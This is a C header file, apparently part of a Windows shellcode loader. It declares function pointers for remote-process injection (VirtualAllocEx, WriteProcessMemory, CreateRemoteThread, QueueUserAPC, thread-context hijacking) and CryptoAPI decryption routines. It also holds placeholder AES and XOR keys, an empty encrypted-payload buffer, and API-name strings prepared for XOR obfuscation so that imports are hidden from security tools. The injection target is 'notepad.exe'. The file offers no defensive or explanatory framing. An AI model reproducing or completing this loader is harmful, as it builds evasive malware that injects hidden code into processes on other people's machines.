#pragma once

typedef FARPROC (WINAPI * GetProcAddress_t)(HMODULE hModule, LPCSTR  lpProcName);
typedef HMODULE (WINAPI * GetModuleHandle_t)(LPCSTR lpModuleName);

typedef BOOL    (WINAPI * VirtualProtect_t)( LPVOID lpAddress,  SIZE_T dwSize, DWORD  flNewProtect,  PDWORD lpflOldProtect );
typedef LPVOID  (WINAPI * VirtualAllocEx_t)( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect );
typedef HANDLE  (WINAPI * CreateRemoteThread_t)( HANDLE hProcess, LPSECURITY_ATTRIBUTES  lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId );
typedef HANDLE  (WINAPI * OpenProcess_t)( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId );
typedef BOOL    (WINAPI * WriteProcessMemory_t)( HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten );
typedef HMODULE (WINAPI * LoadLibraryA_t)( LPCSTR lpLibFileName);
typedef DWORD   (WINAPI * WaitForSingleObject_t)( HANDLE hHandle, DWORD  dwMilliseconds );
typedef BOOL    (WINAPI * CloseHandle_t)( HANDLE hObject );

typedef BOOL (WINAPI * CryptAcquireContextW_t)(HCRYPTPROV *phProv,LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags);
typedef BOOL (WINAPI * CryptCreateHash_t)( HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY  hKey, DWORD dwFlags, HCRYPTHASH *phHash );
typedef BOOL (WINAPI * CryptHashData_t)( HCRYPTHASH hHash, const BYTE *pbData, DWORD dwDataLen, DWORD dwFlags );
typedef BOOL (WINAPI * CryptDeriveKey_t)( HCRYPTPROV hProv, ALG_ID Algid, HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY  *phKey );
typedef BOOL (WINAPI * CryptDecrypt_t)( HCRYPTKEY  hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen );
typedef BOOL (WINAPI * CryptReleaseContext_t)( HCRYPTPROV hProv, DWORD dwFlags );
typedef BOOL (WINAPI * CryptDestroyHash_t)( HCRYPTHASH hHash );
typedef BOOL (WINAPI * CryptDestroyKey_t)( HCRYPTKEY hKey );

typedef HANDLE (WINAPI * CreateToolhelp32Snapshot_t)( DWORD dwFlags, DWORD th32ProcessID );
typedef BOOL (WINAPI * Process32First_t)( HANDLE hSnapshot, LPPROCESSENTRY32 lppe );
typedef BOOL (WINAPI * Process32Next_t)(  HANDLE  hSnapshot, LPPROCESSENTRY32 lppe );

typedef HANDLE (WINAPI * OpenThread_t)( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId );
typedef DWORD (WINAPI * SuspendThread_t)( HANDLE hThread );
typedef DWORD (WINAPI * ResumeThread_t)( HANDLE hThread );
typedef BOOL  (WINAPI * GetThreadContext_t)( HANDLE hThread, LPCONTEXT lpContext );
typedef BOOL (WINAPI * SetThreadContext_t)( HANDLE hThread, const CONTEXT *lpContex);
typedef BOOL (WINAPI * Thread32Next_t)( HANDLE hSnapshot, LPTHREADENTRY32 lpte);

typedef DWORD (WINAPI * QueueUserAPC_t)( PAPCFUNC  pfnAPC, HANDLE hThread, ULONG_PTR dwData);
typedef BOOL (WINAPI * CreateProcessA_t)( LPCSTR lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformatio);

wchar_t wsKernel32DLL[]= L"KERNEL32.DLL";

// TO AES

char AesKey[] = "aeskey";

char payload[] =  "";

// TO XOR
// add space at the end of string to give space to '\0'

char XorKey[] = "xorkey";

char sKernel32DLL[] = "kernel32.dll ";
char sAdvapi32DLL[] = "advapi32.dll ";

char sGetProcAddress[]      = "GetProcAddress ";
char sGetModuleHandleA[]    = "GetModuleHandleA ";
char sOpenProcess[]         = "OpenProcess ";
char sVirtualAllocEx[]      = "VirtualAllocEx ";
char sWriteProcessMemory[]  = "WriteProcessMemory ";
char sCreateRemoteThread[]  = "CreateRemoteThread ";
char sLoadLibraryA[]        = "LoadLibraryA ";
char sCloseHandle[]         = "CloseHandle ";
char sWaitForSingleObject[] = "WaitForSingleObject ";

char sCryptAcquireContextW[] = "CryptAcquireContextW ";
char sCryptCreateHash[]      = "CryptCreateHash ";
char sCryptHashData[]        = "CryptHashData ";
char sCryptDeriveKey[]       = "CryptDeriveKey ";
char sCryptDecrypt[]         = "CryptDecrypt ";
char sCryptReleaseContext[]  = "CryptReleaseContext ";
char sCryptDestroyHash[]     = "CryptDestroyHash ";
char sCryptDestroyKey[]      = "CryptDestroyKey ";

char sCreateToolhelp32Snapshot[] = "CreateToolhelp32Snapshot ";
char sProcess32First[] = "Process32First ";
char sProcess32Next[]  = "Process32Next ";

char sOpenThread[] = "OpenThread ";
char sSuspendThread[] = "SuspendThread ";
char sResumeThread[] = "ResumeThread ";
char sGetThreadContext[] = "GetThreadContext ";
char sSetThreadContext[] = "SetThreadContext ";
char sThread32Next[] = "Thread32Next ";

char sCreateProcessA[] = "CreateProcessA ";
char sQueueUserAPC[] = "QueueUserAPC ";

char sInjectionProcess[] = "notepad.exe ";